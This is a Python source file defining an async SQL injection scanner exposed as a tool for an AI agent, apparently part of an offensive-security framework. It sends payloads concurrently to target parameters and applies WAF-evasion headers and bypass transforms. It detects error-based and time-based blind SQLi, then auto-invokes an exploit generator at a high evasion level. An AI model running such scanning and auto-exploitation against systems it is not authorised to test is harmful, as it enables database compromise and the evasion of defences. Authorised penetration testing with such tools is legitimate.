import json
import urllib.parse
from src.sdk.tool import function_tool
from .common import (
    SQLI_PAYLOADS,
    SQLI_PAYLOADS_ADVANCED,
    _detect_waf,
    _get_evasion_headers,
    _waf_transform_payloads,
    async_fetch_all,
    register_appsec_vulnerability,
)

# ─── SQL INJECTION (Asynchronous Engine Upgrade) ───────────────────────────────

@function_tool()
async def sqli_scanner(url: str, parameter: str = "", method: str = "GET",
                 time_based: bool = True, error_based: bool = True,
                 cookies: str = "", data_params: str = "") -> str:
    """
    Scan for SQL Injection vulnerabilities (Async Engine).
    Tests error-based and time-based blind SQL injection using high-concurrency.
    Automatically detects WAFs, applies bypass transforms, and registers findings.
    
    Args:
        url: Target URL with parameters
        parameter: Specific parameter to test (if empty, tests all)
        method: HTTP method (GET or POST)
        time_based: Test for time-based blind SQLi
        error_based: Test for error-based SQLi
        cookies: Optional cookies
        data_params: POST body data (e.g. "username=admin&password=test")
    
    Returns:
        SQL injection scan results
    """
    results = []
    
    # Parse URL
    parsed = urllib.parse.urlparse(url)
    get_params = dict(urllib.parse.parse_qsl(parsed.query))
    post_params = dict(urllib.parse.parse_qsl(data_params)) if data_params else {}
    
    method_upper = method.upper()
    params_to_test = []
    if parameter:
        if parameter in get_params:
            params_to_test.append((parameter, "GET"))
        elif parameter in post_params or method_upper == "POST":
            post_params.setdefault(parameter, "")
            params_to_test.append((parameter, "POST"))
        else:
            get_params.setdefault(parameter, "")
            params_to_test.append((parameter, "GET"))
    else:
        params_to_test.extend((param, "GET") for param in get_params)
        params_to_test.extend((param, "POST") for param in post_params)
    
    if not params_to_test:
        return (
            "No parameters found. Use a URL with parameters like: "
            "http://target.com/page?id=1, provide 'parameter', or pass POST body params via data_params."
        )
    
    results.append(f"## SQL Injection Scan (Async Engine) for {parsed.netloc}")
    results.append(f"Testing {len(params_to_test)} parameter(s)\n")
    
    # ── WAF Detection + Payload Enhancement ────────────────────────────────
    waf_vendor, waf_conf = _detect_waf(url)
    if waf_conf > 0.2:
        results.append(f"⚠ WAF Detected: {waf_vendor} (confidence: {int(waf_conf*100)}%)")
        results.append(f"  → Applying {waf_vendor}-specific bypass transforms to payloads\n")
    
    # Build comprehensive payload list: basic + all advanced technique categories
    _all_sqli = list(SQLI_PAYLOADS)
    for _cat in SQLI_PAYLOADS_ADVANCED.values():
        _all_sqli.extend(_cat)
    payloads = _waf_transform_payloads(_all_sqli, "sqli", url=url, waf_vendor=waf_vendor)
    
    # ── Baseline Generation (False Positive Reduction) ─────────────────────
    results.append("⏳ Fetching baseline profile to reduce false positives...")
    headers = _get_evasion_headers({"Cookie": cookies} if cookies else None)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    baseline_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(get_params)))
    
    baseline_req = {
        "method": method_upper,
        "url": baseline_url if method_upper == "GET" else base_url,
        "headers": headers,
    }
    if method_upper == "POST":
        baseline_req["data"] = urllib.parse.urlencode(post_params)

    # We need the async loop
    try:
        baseline_responses = await async_fetch_all([baseline_req], max_concurrent=1, timeout_sec=10)
        baseline_resp = baseline_responses[0]
        baseline_text = baseline_resp["text"].lower()
        baseline_time = baseline_resp["elapsed"]
    except Exception as e:
        return f"❌ Failed to fetch baseline: {e}. Cannot perform reliable scanning."
        
    sql_errors = [
        "mysql", "syntax error", "sql", "query failed", "sqlite",
        "postgresql", "ora-", "db2", "microsoft sql", "odbc",
        "warning: mysql", "unclosed quotation", "quoted string"
    ]
    
    # Identify pre-existing errors in baseline to avoid false positives
    baseline_errors = [err for err in sql_errors if err in baseline_text]
    if baseline_errors:
        results.append(f"⚠️ Warning: Baseline page naturally contains SQL error keywords: {baseline_errors}. These will be ignored during testing.")
    
    # ── Request Formulation ────────────────────────────────────────────────
    results.append(f"🚀 Launching async swarm for {len(payloads) * len(params_to_test)} payloads...")
    
    async_requests = []
    
    for param, ptype in params_to_test:
        for payload in payloads:
            test_get = get_params.copy()
            test_post = post_params.copy()
            if ptype == "GET":
                test_get[param] = test_get.get(param, "") + payload
            else:
                test_post[param] = test_post.get(param, "") + payload
            
            req = {
                "headers": headers,
                # Store metadata for processing results later
                "_param": param,
                "_ptype": ptype,
                "_payload": payload
            }
            
            req_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_get)))
            if method_upper == "POST" or ptype == "POST":
                req["method"] = "POST"
                req["url"] = req_url
                req["data"] = urllib.parse.urlencode(test_post)
            else:
                req["method"] = "GET"
                req["url"] = req_url
                
            async_requests.append(req)
            
    # ── Execution ──────────────────────────────────────────────────────────
    scan_results = await async_fetch_all(async_requests, max_concurrent=20, timeout_sec=15)
    
    vulnerable = []
    
    for res in scan_results:
        req_meta = res["req"]
        param = req_meta["_param"]
        payload = req_meta["_payload"]
        
        if res["error"]:
            # If it's a sleep payload and it timed out, that's time-based SQLi
            if time_based and "SLEEP" in payload.upper() and baseline_time < 3.0:
                vulnerable.append({
                    "parameter": param, "payload": payload,
                    "method": req_meta.get("method", "GET"),
                    "request_url": req_meta.get("url", ""),
                    "body": req_meta.get("data", ""),
                    "type": "Time-based Blind SQLi",
                    "evidence": f"Request timed out (baseline was {baseline_time:.2f}s)"
                })
            continue
            
        text = res["text"].lower()
        
        # Error-based detection
        if error_based:
            for error in sql_errors:
                # Must be a NEW error not present in the baseline
                if error in text and error not in baseline_errors:
                    vulnerable.append({
                        "parameter": param, "payload": payload,
                        "method": req_meta.get("method", "GET"),
                        "request_url": req_meta.get("url", ""),
                        "body": req_meta.get("data", ""),
                        "type": "Error-based SQLi",
                        "evidence": f"New SQL error detected: {error}"
                    })
                    break # Don't log same payload twice for different errors
                    
        # Time-based detection
        if time_based and "SLEEP" in payload.upper():
            elapsed = res["elapsed"]
            if baseline_time < 3.0 and elapsed >= 4.5 and elapsed >= baseline_time + 3.0:
                 vulnerable.append({
                    "parameter": param, "payload": payload,
                    "method": req_meta.get("method", "GET"),
                    "request_url": req_meta.get("url", ""),
                    "body": req_meta.get("data", ""),
                    "type": "Time-based Blind SQLi",
                    "evidence": f"Response delayed {elapsed:.2f}s (baseline {baseline_time:.2f}s)"
                })

    # Summary
    results.append("\n## Summary")
    if vulnerable:
        results.append(f"🔴 Found {len(vulnerable)} potential SQL Injection vulnerabilities!")
        
        for vuln in vulnerable:
            results.append(f"  - Parameter: {vuln['parameter']}")
            results.append(f"    Type: {vuln['type']}")
            results.append(f"    Payload: {vuln['payload']}")
            results.append(f"    Evidence: {vuln['evidence']}")
            if vuln.get("method") == "POST":
                results.append(f"    Request: POST {vuln.get('request_url', url)}")
                results.append(f"    Body: {vuln.get('body', '')}")
            else:
                results.append(f"    PoC: curl '{vuln.get('request_url') or url}'")
            
            await register_appsec_vulnerability(
                target_url=url,
                vuln_type=vuln['type'],
                severity="CRITICAL",
                parameter=vuln['parameter'],
                payload=vuln['payload'],
                evidence=vuln['evidence'],
                metadata=json.dumps({
                    "method": vuln.get("method", method_upper),
                    "request_url": vuln.get("request_url", ""),
                    "body": vuln.get("body", ""),
                })
            )
            
        # ── Auto-Exploit Chaining ─────────────────────────────────────
        results.append("\n## Autonomous Exploit Generation")
        try:
            from src.tools.exploit_craft import generate_exploit_code
            
            context_str = f"Target URL: {url}\nMethod: {method}\nCookies: {cookies}\n\nConfirmed Vulnerabilities:\n"
            for v in vulnerable[:2]:
                context_str += f"- Parameter '{v['parameter']}': {v['type']}\nEvidence: {v['evidence']}\nPayload: {v['payload']}\n"
            
            exploit_result = await generate_exploit_code.invoke(
                vuln_type="sqli",
                target_tech="Unknown Web Application",
                context=context_str,
                evasion_level="high",
                language="python"
            )
            
            results.append("✅ Auto-Exploit successfully generated and saved:")
            results.append("\n".join(exploit_result.split("\n")[:10]) + "\n...")
        except ImportError:
            results.append("⚠️ Exploit engine (exploit_craft) not available in this build.")
        except Exception as e:
            results.append(f"⚠️ Exploit generation failed: {str(e)[:100]}")
            
    else:
        results.append("✅ No SQL injection detected.")
    
    results.append("\n💡 Auto-Exploitation: Use `sqlmap_attack` with WAF tamper scripts if WAF is present.")
    
    return "\n".join(results)
